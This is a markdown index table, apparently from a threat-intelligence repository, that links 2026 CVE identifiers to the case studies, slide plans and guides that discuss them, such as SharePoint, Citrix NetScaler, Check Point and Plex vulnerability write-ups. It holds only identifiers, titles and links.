| [CVE-2026-32201](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-32201) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/SHAREPOINT_2026_EXPLOITATION.md), [Slide plan: The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/slides/plans/SHAREPOINT_2026_EXPLOITATION.md) |
| [CVE-2026-32202](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-32202) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2026-33017](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-33017) | [Langflow](/ai-tooling/tools/LANGFLOW.md) |
| [CVE-2026-33634](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-33634) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The European Commission Cloud Breach of 2026: AWS Data Theft Through the Poisoned Trivy Scanner](/case-studies/EUROPEAN_COMMISSION_CLOUD_BREACH_2026.md), [Case Studies](/case-studies/README.md), [The TeamPCP Supply-Chain Campaign of 2026: Trivy, Checkmarx and the Bitwarden CLI (CVE-2026-33634)](/case-studies/TEAMPCP_TRIVY_SUPPLY_CHAIN_2026.md), [Slide plan: The Year 2026 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2026.md), [Slide plan: The European Commission Cloud Breach of 2026: AWS Data Theft Through the Poisoned Trivy Scanner](/case-studies/slides/plans/EUROPEAN_COMMISSION_CLOUD_BREACH_2026.md), [Slide plan: The TeamPCP Supply-Chain Campaign of 2026: Trivy, Checkmarx and the Bitwarden CLI (CVE-2026-33634)](/case-studies/slides/plans/TEAMPCP_TRIVY_SUPPLY_CHAIN_2026.md) |
| [CVE-2026-33825](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-33825) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md) |
| [CVE-2026-34621](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-34621) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2026-35273](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-35273) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Oracle PeopleSoft CVE-2026-35273 and the ShinyHunters Mass Exploitation of 2026: A Case Study](/case-studies/ORACLE_PEOPLESOFT_SHINYHUNTERS_2026.md), [Case Studies](/case-studies/README.md), [Slide plan: Oracle PeopleSoft CVE-2026-35273 and the ShinyHunters Mass Exploitation of 2026: A Case Study](/case-studies/slides/plans/ORACLE_PEOPLESOFT_SHINYHUNTERS_2026.md) |
| [CVE-2026-41709](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-41709) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md) |
| [CVE-2026-41940](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-41940) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The cPanel and WHM Authentication Bypass of 2026 (CVE-2026-41940): A Case Study](/case-studies/CPANEL_WHM_CVE_2026_41940.md), [Case Studies](/case-studies/README.md), [Slide plan: The cPanel and WHM Authentication Bypass of 2026 (CVE-2026-41940): A Case Study](/case-studies/slides/plans/CPANEL_WHM_CVE_2026_41940.md) |
| [CVE-2026-45321](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-45321) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md) |
| [CVE-2026-45659](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-45659) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Case Studies](/case-studies/README.md), [The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/SHAREPOINT_2026_EXPLOITATION.md), [Slide plan: The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/slides/plans/SHAREPOINT_2026_EXPLOITATION.md) |
| [CVE-2026-46300](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-46300) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md) |
| [CVE-2026-46817](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-46817) | [Oracle PeopleSoft CVE-2026-35273 and the ShinyHunters Mass Exploitation of 2026: A Case Study](/case-studies/ORACLE_PEOPLESOFT_SHINYHUNTERS_2026.md) |
| [CVE-2026-48027](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-48027) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md) |
| [CVE-2026-48172](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-48172) | [The cPanel and WHM Authentication Bypass of 2026 (CVE-2026-41940): A Case Study](/case-studies/CPANEL_WHM_CVE_2026_41940.md) |
| [CVE-2026-48356](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-48356) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [E-Commerce Threats: The Public Record, 1999 to 2026](/case-studies/ECOMMERCE_THREATS.md), [Magento and Adobe Commerce, CVE-2026-48356: Lab-Verified Exposure and Fix](/case-studies/MAGENTO_CVE_2026_48356.md), [PHP 8.4.27, CVE-2026-109618 and CVE-2026-109619: Two Fixes Verified in the Lab](/case-studies/PHP_8_4_27_CVES.md), [Case Studies](/case-studies/README.md), [Slide plan: E-Commerce Threats: The Public Record, 1999 to 2026](/case-studies/slides/plans/ECOMMERCE_THREATS.md), [Slide plan: Magento and Adobe Commerce, CVE-2026-48356: Lab-Verified Exposure and Fix](/case-studies/slides/plans/MAGENTO_CVE_2026_48356.md) |
| [CVE-2026-48558](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-48558) | [Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/NABLE_NCENTRAL_ABLE2SHELL_2026.md) |
| [CVE-2026-50522](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-50522) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/SHAREPOINT_2026_EXPLOITATION.md), [Slide plan: The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/slides/plans/SHAREPOINT_2026_EXPLOITATION.md) |
| [CVE-2026-50751](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-50751) | [The ATF Major Incident of 2026: A Case Study](/case-studies/ATF_MAJOR_INCIDENT_2026.md), [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [The Check Point Remote Access VPN IKEv1 Authentication Bypass of 2026 (CVE-2026-50751): A Case Study](/case-studies/CHECK_POINT_VPN_CVE_2026_50751.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Case Studies](/case-studies/README.md), [Slide plan: The ATF Major Incident of 2026: A Case Study](/case-studies/slides/plans/ATF_MAJOR_INCIDENT_2026.md), [Slide plan: CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/slides/plans/CHECK_POINT_GAIA_CVE_2026_123039.md), [Slide plan: The Check Point Remote Access VPN IKEv1 Authentication Bypass of 2026 (CVE-2026-50751): A Case Study](/case-studies/slides/plans/CHECK_POINT_VPN_CVE_2026_50751.md) |
| [CVE-2026-54420](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-54420) | [The cPanel and WHM Authentication Bypass of 2026 (CVE-2026-41940): A Case Study](/case-studies/CPANEL_WHM_CVE_2026_41940.md) |
| [CVE-2026-55040](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-55040) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/SHAREPOINT_2026_EXPLOITATION.md), [Slide plan: The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/slides/plans/SHAREPOINT_2026_EXPLOITATION.md) |
| [CVE-2026-56164](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-56164) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/SHAREPOINT_2026_EXPLOITATION.md), [Slide plan: The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/slides/plans/SHAREPOINT_2026_EXPLOITATION.md) |
| [CVE-2026-58644](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-58644) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Case Studies](/case-studies/README.md), [The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/SHAREPOINT_2026_EXPLOITATION.md), [Slide plan: The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/slides/plans/SHAREPOINT_2026_EXPLOITATION.md) |
| [CVE-2026-59310](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-59310) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md) |
| [CVE-2026-63077](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-63077) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md) |
| [CVE-2026-65660](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-65660) | [Case Studies](/case-studies/README.md), [The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/SHAREPOINT_2026_EXPLOITATION.md), [Slide plan: The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/slides/plans/SHAREPOINT_2026_EXPLOITATION.md) |
| [CVE-2026-71362](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-71362) | [E-Commerce Threats: The Public Record, 1999 to 2026](/case-studies/ECOMMERCE_THREATS.md), [Slide plan: E-Commerce Threats: The Public Record, 1999 to 2026](/case-studies/slides/plans/ECOMMERCE_THREATS.md) |
| [CVE-2026-75650](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-75650) | [E-Commerce Threats: The Public Record, 1999 to 2026](/case-studies/ECOMMERCE_THREATS.md), [Slide plan: E-Commerce Threats: The Public Record, 1999 to 2026](/case-studies/slides/plans/ECOMMERCE_THREATS.md) |
| [CVE-2026-76504](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-76504) | [The Cisco Catalyst SD-WAN Authentication Bypass of 2026 (CVE-2026-20127) and UAT-8616: A Case Study](/case-studies/CISCO_SDWAN_CVE_2026_20127.md), [Slide plan: The Cisco Catalyst SD-WAN Authentication Bypass of 2026 (CVE-2026-20127) and UAT-8616: A Case Study](/case-studies/slides/plans/CISCO_SDWAN_CVE_2026_20127.md) |
| [CVE-2026-84869](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-84869) | [Major Cloud Security Incidents: The Public Record, 2011 to 2026](/case-studies/CLOUD_SECURITY_INCIDENTS.md), [The ConnectWise Cloud Backup Compromise of October 2026: A Case Study](/case-studies/CONNECTWISE_STORM_0940_2026.md), [Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/NABLE_NCENTRAL_ABLE2SHELL_2026.md) |
| [CVE-2026-85046](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-85046) | [Chrome Isolated Web Apps: Vulnerabilities and Abuse in 2026](/case-studies/CHROME_ISOLATED_WEB_APPS_2026.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Slide plan: Chrome Isolated Web Apps: Vulnerabilities and Abuse in 2026](/case-studies/slides/plans/CHROME_ISOLATED_WEB_APPS_2026.md) |
| [CVE-2026-85102](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-85102) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [The Check Point Remote Access VPN IKEv1 Authentication Bypass of 2026 (CVE-2026-50751): A Case Study](/case-studies/CHECK_POINT_VPN_CVE_2026_50751.md), [Slide plan: CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/slides/plans/CHECK_POINT_GAIA_CVE_2026_123039.md) |
| [CVE-2026-85880](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-85880) | [Chrome Isolated Web Apps: Vulnerabilities and Abuse in 2026](/case-studies/CHROME_ISOLATED_WEB_APPS_2026.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md) |
| [CVE-2026-86218](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-86218) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [Major Cloud Security Incidents: The Public Record, 2011 to 2026](/case-studies/CLOUD_SECURITY_INCIDENTS.md), [Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/NABLE_NCENTRAL_ABLE2SHELL_2026.md) |
| [CVE-2026-87491](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-87491) | [Chrome Isolated Web Apps: Vulnerabilities and Abuse in 2026](/case-studies/CHROME_ISOLATED_WEB_APPS_2026.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md) |
| [CVE-2026-87886](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-87886) | [The cPanel and WHM Authentication Bypass of 2026 (CVE-2026-41940): A Case Study](/case-studies/CPANEL_WHM_CVE_2026_41940.md) |
| [CVE-2026-88771](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-88771) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/CITRIX_NETSCALER_CVE_2026_3055.md), [The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/CITRIX_NETSCALER_SEPTEMBER_2026.md), [Case Studies](/case-studies/README.md), [Slide plan: The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/slides/plans/CITRIX_NETSCALER_SEPTEMBER_2026.md) |
| [CVE-2026-88772](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-88772) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/CITRIX_NETSCALER_CVE_2026_3055.md), [The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/CITRIX_NETSCALER_SEPTEMBER_2026.md), [Case Studies](/case-studies/README.md), [Slide plan: The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/slides/plans/CITRIX_NETSCALER_SEPTEMBER_2026.md) |
| [CVE-2026-88773](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-88773) | [The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/CITRIX_NETSCALER_SEPTEMBER_2026.md) |
| [CVE-2026-88774](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-88774) | [The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/CITRIX_NETSCALER_SEPTEMBER_2026.md) |
| [CVE-2026-88775](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-88775) | [The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/CITRIX_NETSCALER_SEPTEMBER_2026.md) |
| [CVE-2026-88777](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-88777) | [The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/CITRIX_NETSCALER_SEPTEMBER_2026.md) |
| [CVE-2026-88778](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-88778) | [The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/CITRIX_NETSCALER_SEPTEMBER_2026.md) |
| [CVE-2026-88779](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-88779) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/CITRIX_NETSCALER_CVE_2026_3055.md), [The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/CITRIX_NETSCALER_SEPTEMBER_2026.md), [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md), [Case Studies](/case-studies/README.md), [Slide plan: The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/slides/plans/CITRIX_NETSCALER_SEPTEMBER_2026.md) |
| [CVE-2026-91843](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-91843) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md) |
| [CVE-2026-93616](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-93616) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [The Check Point Remote Access VPN IKEv1 Authentication Bypass of 2026 (CVE-2026-50751): A Case Study](/case-studies/CHECK_POINT_VPN_CVE_2026_50751.md), [Slide plan: CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/slides/plans/CHECK_POINT_GAIA_CVE_2026_123039.md) |
| [CVE-2026-96652](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-96652) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md), [Plex Media Server, CVE-2026-96652, CVE-2026-96654, CVE-2026-96655 and CVE-2026-96656: The Plex2Shell Chain in the Lab](/case-studies/PLEX_MEDIA_SERVER_2026_CVES.md), [Case Studies](/case-studies/README.md), [Slide plan: Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/slides/plans/EXPOSURE_CHECKS_2026_11.md), [Slide plan: Plex Media Server, CVE-2026-96652, CVE-2026-96654, CVE-2026-96655 and CVE-2026-96656: The Plex2Shell Chain in the Lab](/case-studies/slides/plans/PLEX_MEDIA_SERVER_2026_CVES.md) |
| [CVE-2026-96654](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-96654) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md), [Plex Media Server, CVE-2026-96652, CVE-2026-96654, CVE-2026-96655 and CVE-2026-96656: The Plex2Shell Chain in the Lab](/case-studies/PLEX_MEDIA_SERVER_2026_CVES.md), [Case Studies](/case-studies/README.md), [Slide plan: Plex Media Server, CVE-2026-96652, CVE-2026-96654, CVE-2026-96655 and CVE-2026-96656: The Plex2Shell Chain in the Lab](/case-studies/slides/plans/PLEX_MEDIA_SERVER_2026_CVES.md) |
| [CVE-2026-96655](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-96655) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Plex Media Server, CVE-2026-96652, CVE-2026-96654, CVE-2026-96655 and CVE-2026-96656: The Plex2Shell Chain in the Lab](/case-studies/PLEX_MEDIA_SERVER_2026_CVES.md), [Case Studies](/case-studies/README.md), [Slide plan: Plex Media Server, CVE-2026-96652, CVE-2026-96654, CVE-2026-96655 and CVE-2026-96656: The Plex2Shell Chain in the Lab](/case-studies/slides/plans/PLEX_MEDIA_SERVER_2026_CVES.md) |
| [CVE-2026-96656](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-96656) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Plex Media Server, CVE-2026-96652, CVE-2026-96654, CVE-2026-96655 and CVE-2026-96656: The Plex2Shell Chain in the Lab](/case-studies/PLEX_MEDIA_SERVER_2026_CVES.md), [Case Studies](/case-studies/README.md), [Slide plan: Plex Media Server, CVE-2026-96652, CVE-2026-96654, CVE-2026-96655 and CVE-2026-96656: The Plex2Shell Chain in the Lab](/case-studies/slides/plans/PLEX_MEDIA_SERVER_2026_CVES.md) |
| [CVE-2026-96951](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-96951) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md), [Slide plan: Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/slides/plans/EXPOSURE_CHECKS_2026_11.md) |
| [CVE-2026-97229](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-97229) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md), [GitLab, CVE-2026-97229: Lab-Verified Exposure and Fix](/case-studies/GITLAB_CVE_2026_97229.md), [Case Studies](/case-studies/README.md), [SSHole: The OpenSSH Authentication Bypass of November 2026 (CVE-2026-123158)](/case-studies/SSHOLE_CVE_2026_123158.md), [Slide plan: Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/slides/plans/EXPOSURE_CHECKS_2026_11.md), [Slide plan: GitLab, CVE-2026-97229: Lab-Verified Exposure and Fix](/case-studies/slides/plans/GITLAB_CVE_2026_97229.md) |
| [CVE-2026-98432](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-98432) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Ghostcat, CVE-2020-1938: The Tomcat AJP File Read in the Lab](/case-studies/GHOSTCAT_CVE_2020_1938.md), [The CVE-2026-98432 Linux Kernel Flaw and an AI-Written Exploit: A 2026 Case Study](/case-studies/LINUX_TCP_UAF_2026.md), [Magento and Adobe Commerce, CVE-2026-48356: Lab-Verified Exposure and Fix](/case-studies/MAGENTO_CVE_2026_48356.md), [The Multipath TCP Attack Surface: A 2026 Case Study](/case-studies/MPTCP_ATTACK_SURFACE_2026.md), [Node.js, CVE-2026-111497: Version Check and Fix in the Lab](/case-studies/NODEJS_CVE_2026_111497.md), [PHP 8.4.27, CVE-2026-109618 and CVE-2026-109619: Two Fixes Verified in the Lab](/case-studies/PHP_8_4_27_CVES.md), [Plex Media Server, CVE-2026-96652, CVE-2026-96654, CVE-2026-96655 and CVE-2026-96656: The Plex2Shell Chain in the Lab](/case-studies/PLEX_MEDIA_SERVER_2026_CVES.md), [Case Studies](/case-studies/README.md), [SSHole: The OpenSSH Authentication Bypass of November 2026 (CVE-2026-123158)](/case-studies/SSHOLE_CVE_2026_123158.md), [Harden a Linux Host](/guides/HARDEN_A_LINUX_HOST.md) |
| [CVE-2026-102764](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-102764) | [The BeyondTrust Remote Support and PRA Command Injection of 2026 (CVE-2026-1731): A Case Study](/case-studies/BEYONDTRUST_REMOTE_SUPPORT_CVE_2026_1731.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Slide plan: The BeyondTrust Remote Support and PRA Command Injection of 2026 (CVE-2026-1731): A Case Study](/case-studies/slides/plans/BEYONDTRUST_REMOTE_SUPPORT_CVE_2026_1731.md) |
| [CVE-2026-104935](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-104935) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The Ivanti Connect Secure Zero-Day Chain of October 2026 (CVE-2026-104935, CVE-2026-111357, CVE-2026-118527): A Case Study](/case-studies/IVANTI_CONNECT_SECURE_2026.md), [Case Studies](/case-studies/README.md), [Slide plan: The Ivanti Connect Secure Zero-Day Chain of October 2026 (CVE-2026-104935, CVE-2026-111357, CVE-2026-118527): A Case Study](/case-studies/slides/plans/IVANTI_CONNECT_SECURE_2026.md) |
| [CVE-2026-105133](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-105133) | [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md), [Slide plan: Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/slides/plans/EXPOSURE_CHECKS_2026_11.md) |
| [CVE-2026-105134](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-105134) | [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md) |
| [CVE-2026-105481](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-105481) | [Node.js, CVE-2026-111497: Version Check and Fix in the Lab](/case-studies/NODEJS_CVE_2026_111497.md) |
| [CVE-2026-106931](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-106931) | [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md) |
| [CVE-2026-109618](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-109618) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md), [PHP2Shell and the October 2026 Attack Wave: A Case Study](/case-studies/PHP2SHELL_OCTOBER_2026.md), [PHP 8.4.27, CVE-2026-109618 and CVE-2026-109619: Two Fixes Verified in the Lab](/case-studies/PHP_8_4_27_CVES.md), [Case Studies](/case-studies/README.md), [Slide plan: Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/slides/plans/EXPOSURE_CHECKS_2026_11.md), [Slide plan: PHP 8.4.27, CVE-2026-109618 and CVE-2026-109619: Two Fixes Verified in the Lab](/case-studies/slides/plans/PHP_8_4_27_CVES.md) |
